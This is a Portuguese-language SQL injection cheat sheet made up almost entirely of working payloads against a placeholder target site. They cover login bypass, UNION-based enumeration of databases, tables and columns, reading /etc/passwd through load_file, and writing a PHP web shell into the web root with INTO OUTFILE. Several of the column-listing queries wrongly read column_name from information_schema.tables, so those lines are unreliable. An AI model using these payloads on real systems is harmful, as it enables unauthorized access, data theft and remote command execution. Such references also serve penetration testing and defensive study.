# SQL Injection (SQLi)

## Bypass Authentication
Uma forma de burlar formulários de login que utilizam requisições SQL é alterar a query criando uma lógica sempre verdadeira e comentando o resto do código. Primeiro envie caracteres especiais como `\` e `'` e analise o comportamento da aplicação. Confirmando a vulnerabilidade de SQLi utilize um payload que será sempre verdadeiro como no exemplo:

`' or 1=1#`

## SQL Error Based

É um SQLi baseado em erro, testamos a aplicação enviando caracteres como `\` ou `'` e recebemos um erro.    

### Descobrindo quantidade de colunas da tabela

Para descobrir a quantidade de colunas na tabela e onde os dados estão sendo retornados na página, utilize `' UNION SELECT 1 %23` e vá incluindo outros valores após o 1 no select, até a consulta retornar os valores utilizados no select refletidos na página.  

`http://www.alvo.com.br/info.php?p=' union select 1,2,3,4,5 %23'`

Outra forma seria utilizando `ORDER BY 1` e tentando ordenar a consulta pelo número da coluna. Vá aumentando o valor de 1 até a aplicação indicar que não existem mais colunas.

`http://www.alvo.com.br/info.php?p=' order by 6 %23'`

### Exploração

Após identificar a quantidade de colunas e quais estão sendo refletidas na página, utilize comandos de SQL no lugar das colunas refletidas para exibir a resposta da consulta.

`http://www.alvo.com.br/info.php?p=' union select 1,2,version(),user(),database() %23'`

### Bypass Addslash

Algumas aplicações podem adicionar uma ``\`` no valor do parâmetro ao tratar as informações, essa função pode acabar quebrando a nossa query. Uma forma de realizar o bypass é enviando o valor do parâmetro em ASCII.

Para converter uma string em ASCII Decimal utilize:
`echo -n "valor" | od -An -tDC`



**Comandos:**  
Retornar o nome de todas as tabelas do information_schema  
`' union select 1,2,table_name,4,5 from information_schema.tables %23'`

Retornar o nome de todas as tabelas de um banco específico  
`' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="nome_banco" %23'`

Retornar o nome de todas as colunas de um banco  
`' union select 1,2,column_name,4,5 from information_schema.tables where table_schema="nome_banco" %23'`

Retornar o nome de todas as colunas de uma tabela  
`' union select 1,2,column_name,4,5 from information_schema.tables where table_schema="nome_banco" and table_name="nome_tabela" %23'`

Retornar valores de uma tabela  
`' union select 1,2,nome_coluna1,nome_coluna2,5 from nome_tabela %23'`
`' union select 1,2,concat(nome_coluna1,':',nome_coluna2),4,5 from nome_tabela %23'`

Ler arquivos do servidor  
`' union select 1,2,load_file("/etc/passwd"),4,5 %23'`

Criar arquivos no servidor  
`' union select 1,2,"<?php system($_GET['p']); ?>",4,5 INTO OUTFILE "/var/www/html/rce.php"%23'`